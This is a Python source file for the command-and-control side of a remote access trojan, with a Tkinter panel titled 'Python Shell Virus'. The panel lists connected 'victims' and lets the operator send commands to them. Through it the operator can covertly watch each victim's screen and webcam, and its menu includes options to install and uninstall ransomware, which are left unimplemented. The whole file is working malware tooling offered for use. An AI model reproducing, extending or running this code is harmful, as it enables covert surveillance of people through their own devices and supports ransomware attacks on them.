import socket
import threading
from host_constants import *
from constants import *
import tkinter as tk
import ScreenSharing.watcher.watcher as scWatcher
import WebCamSharing.watcher.watcher as wcWatcher
from time import sleep

victims = {} 
# How the dictionary looks like
# victims = {('127.0.0.1', 4444) : {'commands' : socket.socket, 'screenShare' : socket.socket, 'webCamShare' : socket.socket}}

def startServer():
    print("Starting server...")
    print("Watiting for victims to connect...")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(( HOST_IP,   HOST_PORT))
    server_socket.listen()

    while True:
        clientSoc, clientAddr = server_socket.accept()
        threading.Thread(target=handleVictim, args=(
            clientSoc, clientAddr, )).start()


def handleVictim(soc, socAddr):
    connectionType = soc.recv(1).decode()

    victimIp = socAddr[0]

    if victimIp not in list(victims):
        victims[victimIp] = dict()

    if connectionType == COMMANDS_CHANNEL:
        print(f"{socAddr} Commands Channel Has been connected!")
        victims[victimIp][COMMANDS_CHANNEL] = soc

    elif connectionType == SCREEN_SHARE_CHANNEL:
        print(f"{socAddr} Screen Sharing Channel Has been connected!")
        victims[victimIp][SCREEN_SHARE_CHANNEL] = soc

    elif connectionType == WEB_CAM_SHARE_CHANNEL:
        print(f"{socAddr} Web Camera Sharing Channel Has been connected!")
        victims[victimIp][WEB_CAM_SHARE_CHANNEL] = soc


def processCommand(command, selectedVictim):

    print(f"command: {command}, victim: {selectedVictim}")

    print("Sending command!")
    sendCommand(command, victims[selectedVictim][COMMANDS_CHANNEL])
    print("Command has been sent!")

    if command ==  WATCH_SCREEN_COMMAND:
        threading.Thread(target= handleScreenSharing, args=(selectedVictim, )).start()

    elif command ==  WATCH_WEBCAM_COMMAND:
        threading.Thread(target= handleWebCameraSharing, args=(selectedVictim, )).start()

    elif command ==  INSTALL_RANSOMWARE_COMMAND:
        pass

    elif command ==  UNINSTALL_RANSOMWARE_COMMAND:
        pass


def handleScreenSharing(selectedVictim):
    
    # sleep(2)
    # while SCREEN_SHARE_CHANNEL not in victims[selectedVictim].keys():
    #     print("Waiting for the screen sharing channel to connect")
    #     sleep(1)

    while SCREEN_SHARE_CHANNEL not in victims[selectedVictim].keys():
        print("Waiting for the web camera sharing channel to connect")
        sleep(1)

    scWatcher.watchScreen(victims[selectedVictim][SCREEN_SHARE_CHANNEL])

def handleWebCameraSharing(selectedVictim):
    while WEB_CAM_SHARE_CHANNEL not in victims[selectedVictim].keys():
        print("Waiting for the web camera sharing channel to connect")
        sleep(1)

    wcWatcher.watchWebCam(victims[selectedVictim][WEB_CAM_SHARE_CHANNEL])


def sendCommand(command, victimSoc):
    victimSoc.send(command.encode())

def reloadWindow(window):
    print("Reloading UI...")
    window.destroy()
    buildUI()


def buildUI():
    print("Building UI...")

    window = tk.Tk()
    window.title("Python Shell Virus")

    # for scrolling vertically
    yscrollbar = tk.Scrollbar(window)
    yscrollbar.pack(side = tk.RIGHT, fill = tk.Y)

    # Headers Labels
    tk.Label(text="Welcome To The Python Virus Shell!").pack()
    tk.Label(text="What Would You Like To Do?").pack()


    # Opertaion list
    variable = tk.StringVar(window)
    variable.set("Watch Screen") # default value
    opertaionList = tk.OptionMenu(window, variable,  WATCH_SCREEN_COMMAND,  WATCH_WEBCAM_COMMAND,  INSTALL_RANSOMWARE_COMMAND,  UNINSTALL_RANSOMWARE_COMMAND)
    opertaionList.pack()

    # Victims list
    victims_list = tk.Listbox(window, selectmode = "single", 
                yscrollcommand = yscrollbar.set)
    # Widget expands horizontally and 
    # vertically by assigning both to
    # fill option
    victims_list.pack(padx = 10, pady = 10,
            expand = tk.YES, fill = "both")
    x = list(victims)
    
    for each_item in range(len(x)):
        victims_list.insert(tk.END, x[each_item])
        victims_list.itemconfig(each_item, bg = "lime")


    # Attach listbox to vertical scrollbar
    yscrollbar.config(command = victims_list.yview)

    # Start Button
    startBtn = tk.Button(
        text="Start!",
        command= lambda: processCommand(variable.get() ,victims_list.get(tk.ACTIVE)),
    )
    startBtn.pack()

    # Reload Button
    reloadBtn = tk.Button(
        text="Reload!",
        command= lambda : reloadWindow(window),
    )
    reloadBtn.pack()

    window.mainloop()




def main():
    threading.Thread(target=startServer).start()
    buildUI()    

if __name__ == "__main__":
    main()
